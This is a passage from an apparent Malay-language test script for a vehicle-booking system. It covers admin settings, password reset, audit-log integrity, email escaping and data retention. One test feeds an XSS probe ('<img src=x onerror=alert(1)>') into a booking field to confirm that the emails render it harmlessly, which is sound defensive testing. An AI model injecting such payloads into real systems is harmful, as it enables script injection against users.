  p('admin_tetapkan_peranan', { id: u.id, peranan: 'pelulus', aktif: true }, admin.token);
}
semak('admin_pengguna tidak mendedahkan hash/salt', !JSON.stringify(p('admin_pengguna', {}, admin.token).data).match(/[0-9a-f]{64}/));
jangkaOk('admin tambah kenderaan', p('admin_simpan_kenderaan', { jenis: 'van', nama: 'Van 2', no_plat: 'abc 1234', kapasiti: 9 }, admin.token));
jangkaRalat('no plat pendua ditolak', p('admin_simpan_kenderaan', { jenis: 'van', nama: 'Van 3', no_plat: 'ABC 1234', kapasiti: 9 }, admin.token), 'sudah wujud');
jangkaRalat('jenis kenderaan tidak sah (admin)', p('admin_simpan_kenderaan', { jenis: 'kereta', nama: 'K', no_plat: 'K1', kapasiti: 4 }, admin.token), 'Jenis');
{
  const v = p('admin_kenderaan', {}, admin.token).data.find((x) => x.no_plat === 'ABC 1234');
  jangkaOk('admin nyahaktif kenderaan', p('admin_simpan_kenderaan', { id: v.id, jenis: 'van', nama: 'Van 2', no_plat: 'ABC 1234', kapasiti: 9, aktif: false }, admin.token));
  semak('kenderaan tidak aktif tidak ditawarkan', !p('cari_kosong', { mula: hari(40), tamat: hari(40, 2) }, ali.token).data.kenderaan.some((x) => x.no_plat === 'ABC 1234'));
}
jangkaOk('admin tambah pemandu', p('admin_simpan_pemandu', { nama: 'Zul' }, admin.token));
jangkaOk('admin ubah tetapan had hari', p('admin_simpan_tetapan', { kunci: 'had_hari_tempahan', nilai: '30' }, admin.token));
jangkaRalat('tetapan 31 hari kini ditolak', (() => { const id = draf(ali.token, { tarikh_mula: hari(31), tarikh_tamat: hari(31, 2) }).data.id; return p('hantar_permohonan', { id }, ali.token); })(), '30 hari');
p('admin_simpan_tetapan', { kunci: 'had_hari_tempahan', nilai: '60' }, admin.token);
jangkaRalat('kunci tetapan rekaan ditolak', p('admin_simpan_tetapan', { kunci: 'PEPPER', nilai: '1' }, admin.token), 'tidak dikenali');
jangkaRalat('nilai tetapan bukan nombor ditolak', p('admin_simpan_tetapan', { kunci: 'had_batal_jam', nilai: 'abc' }, admin.token), 'nombor');
jangkaOk('admin tetap domain emel', p('admin_simpan_tetapan', { kunci: 'domain_emel', nilai: 'org.my' }, admin.token));
jangkaRalat('domain luar ditolak semasa daftar', p('daftar', { emel: 'x@gmail.com', nama: 'Luar', kata_laluan: KATA, persetujuan: true }), '@org.my');
jangkaOk('domain dalam diterima semasa daftar', p('daftar', { emel: 'dalam@org.my', nama: 'Dalam', kata_laluan: KATA, persetujuan: true }));
p('admin_simpan_tetapan', { kunci: 'domain_emel', nilai: '' }, admin.token);
semak('admin lihat semua permohonan (bukan draf)', p('admin_semua_permohonan', {}, admin.token).data.every((r) => r.status !== 'draf'));

// ------------------------------------------------------------- profil & kata laluan
jangkaOk('kemas kini profil', p('kemas_kini_profil', { nama: 'Ali Baharu', jabatan: 'IT', telefon: '0123456789' }, ali.token));
semak('profil dikemas kini', p('profil_saya', {}, ali.token).data.nama === 'Ali Baharu');
jangkaRalat('profil: nama kosong ditolak', p('kemas_kini_profil', { nama: ' ' }, ali.token), 'Nama');
semak('kemas kini profil tidak boleh ubah peranan', (() => { p('kemas_kini_profil', { nama: 'Ali Baharu', peranan: 'admin' }, ali.token); return p('profil_saya', {}, ali.token).data.peranan === 'pemohon'; })());
jangkaRalat('tukar kata: kata lama salah', p('tukar_kata', { kata_lama: 'salah-salah', kata_baru: 'BaruBaru123' }, ali.token), 'tidak betul');
jangkaOk('tukar kata laluan', p('tukar_kata', { kata_lama: KATA, kata_baru: 'BaruBaru123' }, ali.token));
jangkaRalat('kata lama tidak lagi berfungsi', p('log_masuk', { emel: 'ali@org.my', kata_laluan: KATA }), 'tidak betul');
jangkaOk('kata baharu berfungsi', p('log_masuk', { emel: 'ali@org.my', kata_laluan: 'BaruBaru123' }));
{
  const awal = g.outbox.length;
  p('lupa_kata', { emel: 'ali@org.my' });
  const kod = /<b[^>]*>(\d{6})<\/b>/.exec(g.outbox[awal].htmlBody)[1];
  jangkaRalat('tetap semula: kod salah', p('tetap_semula', { emel: 'ali@org.my', kod: '000000', kata_baru: 'Ketiga12345' }), 'tidak betul');
  jangkaRalat('tetap semula: kata baharu pendek', p('tetap_semula', { emel: 'ali@org.my', kod, kata_baru: 'pendek' }), '8 aksara');
  jangkaOk('tetap semula dengan kod betul', p('tetap_semula', { emel: 'ali@org.my', kod, kata_baru: 'Ketiga12345' }));
  jangkaOk('login dengan kata baharu', p('log_masuk', { emel: 'ali@org.my', kata_laluan: 'Ketiga12345' }));
  const awal2 = g.outbox.length;
  const j = p('lupa_kata', { emel: 'tiada@org.my' });
  semak('lupa kata emel tiada: jawapan sama, tiada emel', j.ok && g.outbox.length === awal2);
}

// ------------------------------------------------------------- audit & lain-lain
{
  const audit = () => g.jalan('baca("Audit")').map((a) => JSON.stringify(a));
  const sebelum = audit();
  for (let i = 0; i < 3; i++) p('profil_saya', {}, admin.token);
  p('kemas_kini_profil', { nama: 'Dina Admin' }, admin.token);
  const selepas = audit();
  semak('audit hanya bertambah dan baris lama tidak berubah', selepas.length > sebelum.length && sebelum.every((b, i) => b === selepas[i]));
  const semuaAudit = g.lembaran.get('Audit').semuaSel().map((c) => String(c.v)).join('\n');
  semak('audit tidak mengandungi hash, salt atau kata laluan', !/[0-9a-f]{64}/.test(semuaAudit.replace(/\b[0-9a-f]{8}-[0-9a-f-]{27}\b/g, '')) && !semuaAudit.includes(KATA));
  const tindakan = new Set(g.jalan('baca("Audit")').map((a) => a.Tindakan));
  semak('audit merekod tindakan utama', ['daftar', 'log_masuk', 'hantar', 'ambil_semakan', 'pulang', 'semak_lengkap', 'lulus', 'tolak', 'batal', 'tetapkan_peranan', 'tempahan_dikunci'].every((t) => tindakan.has(t)), [...tindakan].join());
  semak('audit rekod pengguna yang bertindak', g.jalan('baca("Audit").filter(a=>a.Tindakan==="lulus").every(a=>a.PenggunaID)'));
  const lihat = p('admin_audit', {}, admin.token).data;
  semak('admin_audit pulangkan terbaru dahulu', lihat.length > 0 && lihat[0].masa >= lihat[lihat.length - 1].masa);
}
semak('kegagalan emel tidak membatalkan tindakan', (() => {
  g.luaran.gagalEmel = true;
  const id = draf(ali.token, { tujuan: 'Uji gagal emel' }).data.id;
  const j = p('hantar_permohonan', { id }, ali.token);
  g.luaran.gagalEmel = false;
  const dicatat = g.jalan('baca("Audit").some(a=>a.Tindakan==="emel_gagal")');
  p('batal_permohonan', { id }, ali.token);
  return j.ok && dicatat;
})());
semak('emel dihurai HTML (XSS dalam tujuan tidak dirender)', (() => {
  const id = draf(ali.token, { tujuan: '<img src=x onerror=alert(1)>' }).data.id;
  p('hantar_permohonan', { id }, ali.token);
  const m = g.outbox.filter((x) => x.to === 'bakar@org.my').pop();
  p('batal_permohonan', { id }, ali.token);
  return !m.htmlBody.includes('<img') && m.htmlBody.includes('&lt;img');
})());
{
  // retensi PDPA
  const tua = draf(ali.token, { tujuan: 'Rekod lama untuk dipadam' }).data.id;
  p('batal_permohonan', { id: tua }, ali.token);
  const lama = new Date(Date.now() - 4 * 365 * 86400000).toISOString();
  g.jalan('kemas("Permohonan","' + tua + '",{Dikemas:"' + lama + '"})');
  const baru = draf(ali.token, { tujuan: 'Rekod baharu kekal' }).data.id;
  p('batal_permohonan', { id: baru }, ali.token);
  const n = g.jalan('bersihkanRekodLama()');
  semak('retensi padam rekod tertutup melebihi 3 tahun sahaja', n === 1 && g.jalan('baca("Permohonan").every(r=>r.ID!=="' + tua + '")') && g.jalan('baca("Permohonan").some(r=>r.ID==="' + baru + '")'));
}

// ------------------------------------------------------------- keputusan
const gagal = keputusan.filter((k) => !k.lulus);
for (const k of keputusan) if (!k.lulus) console.log(`GAGAL ${k.nama} -- ${k.butiran}`);
console.log(`${keputusan.length - gagal.length}/${keputusan.length} lulus`);
process.exit(gagal.length ? 1 : 0);
